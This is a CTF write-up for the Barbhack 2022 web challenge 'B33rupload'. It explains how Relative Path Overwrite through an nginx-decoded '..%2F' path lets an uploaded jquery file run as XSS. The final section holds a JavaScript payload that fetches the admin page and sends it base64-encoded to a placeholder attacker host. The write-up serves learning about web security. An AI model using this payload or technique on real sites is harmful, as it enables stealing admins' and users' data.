---
source: kevin-mizu
source_url: https://mizu.re/post/b33rupload
title: "B33rupload | mizu.re"
description: "B33rupload"
---

_keyboard\_arrow\_up_

title: B33rupload

date: Aug 30, 2022

tags: [Writeup](https://mizu.re/tag/Writeup) [Barbhack2022](https://mizu.re/tag/Barbhack2022) [Web](https://mizu.re/tag/Web)

# B33rupload

![](https://mizu.re/articles/writeups/Barbhack2022/B33rupload/images/barbhack.png)

* * *

Difficulty: 400 points \| 1 solve 👀

Description: Un ami à vous vient de créer un nouveau site pour upload et télecharger ses fichiers. Méfiant et étant encore en bêta, il vous demande de tester la sécurité de celui-ci. Votre objectif est de récupérer le flag placé sur la page admin ! :)

Author: [Itarow](https://twitter.com/0xItarow) ❤️

* * *

## Table of content

- [🕵️ Recon](https://mizu.re/post/b33rupload#%EF%B8%8F-recon)
- [📁 File upload](https://mizu.re/post/b33rupload#-file-upload)
- [💥 Relative Path Overwrite (RPO)](https://mizu.re/post/b33rupload#-relative-path-overwrite-rpo)
- [🎉 Flag](https://mizu.re/post/b33rupload#-flag)

## 🕵️ Recon

From the challenge's description we know that we will have to deal with upload stuff. When navigating through the website, we can find the following:

![recon_01.gif](https://mizu.re/articles/writeups/Barbhack2022/B33rupload/images/recon_01.gif)

- Login \| Register page
- Upload page
- Admin page inaccessible
- Report page

When login, we get a JWT session cookie without header part which is significative of a `Flask` server.

```
.eJztkctqAzEMRX_FaD0UPyQ_5iu6LyHItpwZmDZlPFmF_Huc9he67EpI9x44oDuc28Z9kQ7zxx3UMQZ8Su98EZjgfRPuorbrRa1f6rgqLmWE6ljWrr5H5w1Oj-mf-1PuNI2n7NIXmI_9JmNbK8wgCXXLmmILVGJFcXFc2GgrlZlYjM3kdSuuYcyIiVtrWpL1FtG27AtlisUUTyQhUdA_gMs2RkSDJE7X5tAWJ0hGfChcUsiOo-NUX_rnW5f91ybA4wkj1LWM.Yw0N1A.x9C-4He-6Ue9DOFATmZKxunlscY
```

Because the website has a report endpoint, we can suppose that we need to find an `XSS` in some way. When we upload a file and access it, the file is getting automatically downloaded due to `Content-Disposition: attachment; filename=readme.md` header.

![upload.gif](https://mizu.re/articles/writeups/Barbhack2022/B33rupload/images/upload.gif)

## 📁 File upload

At first, even knowing that it was Flask and we need to get an XSS, I have lost a lot of time searching for a file upload to RCE. Yes, I know I'm such a stupid guy...

![file_upload_meme.jpg](https://mizu.re/articles/writeups/Barbhack2022/B33rupload/images/file_upload_meme.jpg)

Anyway, I think it's still important to remind that a writeup isn't representative of a CTF research and most of the time we don't find the solution as fast as it is described.

So during 1 hour, I have tried the following:

- Uploading several file formats.
- Path traversal to `static/` folder.
- CRLF injection to remove `Content-Disposition: attachment` header.
- Invalidate `Content-Disposition: attachment` header. ( [source](https://kabilan1290.medium.com/rfd-vulnerability-and-content-disposition-header-bypass-story-f8f962f54c7d)...)
- Abuse UTF8 filename encoding. ( [source](https://www.rfc-editor.org/rfc/rfc2231#section-4))
- And much more...

## 💥 Relative Path Overwrite (RPO)

At this point, I had no idea about how to get an XSS. So, I took a break and came back when the two following tips were given:

`Tips n°1`: _JQuery is such a shit..._

`Tips n°2`: _Tout est relatif, et cela seul est absolu._

After reading them, I looked the DOM of the home page and found the following:

```html
...
<head>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <link rel="icon" type="image/x-icon" href="beer.svg">
  <script src="js/bootstrap.min.js"></script>
  <script src="jquery-3.6.0.min.js"></script>
  <link rel="stylesheet" href="css/bootstrap.min.css">
  <link rel="stylesheet" type="text/css" href="css/main.css">
  <title>b33r file storage</title>
</head>
...
```

As you can see, all ressources are loaded using relative `PATH`, which in certain circumstances allows `Relative Path Overwrite` exploitation.

What is Relative Path Overwrite?

Relative Path Overwrite or RPO is an attack where an attacker can control the path where a ressource is getting retrieve by the browser. This kind of vulnerability occur when:

- A ressource is loaded with relative PATH.
- A reverse proxy like nginx.

From that context, when a user will make URL encoded path traversal, the following will happen:

![](https://mizu.re/articles/writeups/Barbhack2022/B33rupload/images/RPO_diag.png)

As you can see, because the path traversal is interpreted by nginx. the webserver isn't returning a redirect or an error and browser think that he is loading a resource from the 'example' directory. That's why, for the next requests, the browser will use the user-supplied folder to retrievethe associated resources.

In our context, to make sure the website is vulnerable to `RPO`, we have to verify that `/download/..%2F` return the home page.

![RPO_01.png](https://mizu.re/articles/writeups/Barbhack2022/B33rupload/images/RPO_01.png)

As we can see, the page is completely broken. Futhermore, looking into the developer console, we can see all ressources getting loaded from `/download`.

![RPO_02.png](https://mizu.re/articles/writeups/Barbhack2022/B33rupload/images/RPO_02.png)

Now that we succeed to exploit the RPO, we can upload `jquery-3.6.0.min.js` file to get an `alert()`.

![xss.png](https://mizu.re/articles/writeups/Barbhack2022/B33rupload/images/xss.png)

## 🎉 Flag

The last step is to abuse the XSS to exfiltrate admin page:

```js
fetch("/admin").then(d => d.text()).then((data) => {
    flag = data;
    window.location.href = `http:///{{IP}}?cookie=${btoa(flag)}`;
})
```

Send `/download/..%2F` URL to the bot and we obtain:

```
...
This is the admin page, and this is your flag GG : brb{RP0_l34d5_70_5up3r_C5RF}
...
```

Flag: `brb{RP0_l34d5_70_5up3r_C5RF}`

[_keyboard\_arrow\_left_ Simple Login](https://mizu.re/post/simple_login)

[Cloud Password Manager _keyboard\_arrow\_right_](https://mizu.re/post/cloud_password_manager)